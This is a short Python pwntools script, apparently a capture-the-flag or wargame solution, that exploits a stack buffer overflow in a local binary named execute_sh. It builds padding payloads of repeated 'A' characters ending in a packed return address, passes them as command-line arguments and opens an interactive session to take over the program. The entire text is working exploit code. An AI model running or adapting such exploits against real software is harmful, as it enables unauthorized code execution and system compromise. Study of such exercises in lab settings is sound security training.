from pwn import *

payload = "A" * 256
payload2 = "A" * 512
payload2 += "A" * 28
payload2 += p32(0x0804858e)

context.log_level = "debug"

p = process(["/home/execute_sh/execute_sh",payload,payload2])

p.interactive()
